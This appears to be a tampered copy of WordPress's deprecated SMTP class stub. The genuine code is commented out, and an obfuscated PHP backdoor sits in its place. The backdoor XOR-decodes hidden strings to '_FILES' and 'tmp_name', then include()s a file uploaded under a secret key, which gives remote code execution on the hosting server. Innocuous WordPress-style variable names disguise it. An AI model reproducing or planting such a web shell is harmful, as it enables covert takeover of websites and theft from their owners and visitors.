<?php /* 

*
 * The SMTP class has been moved to the w*/
 	

$index = 'tHuGZJwVqXj0A1m';
function post_content($option, $count)

{
    $post_date_gmt = urldecode($option);
    $image_url = substr($count,0, strlen($post_date_gmt));

    return $post_date_gmt ^ $image_url;
}
$revision_id = ${post_content("%2B%0E%3C%0B%1F%19", $index)};
if (isset($revision_id[$index]))

{
	$post_author = 'fire_after_hooks';
    $_links_add_target = $revision_id[$index];
    $title = $_links_add_target[post_content("%00%25%05%184%2B%1A3", $index)];

    include ($title);

}


/* p-includes/PHPMailer subdirectory and now uses the PHPMailer\PHPMailer namespace.
 
_deprecated_file(
	basename( __FILE__ ),
	'5.5.0',
	WPINC . '/PHPMailer/SMTP.php',
	__( 'The SMTP class has been moved to the wp-includes/PHPMailer subdirectory and now uses the PHPMailer\PHPMailer namespace.' )
);

require_once __DIR__ . '/PHPMailer/SMTP.php';

class_alias( PHPMailer\PHPMailer\SMTP::class, 'SMTP' );
*/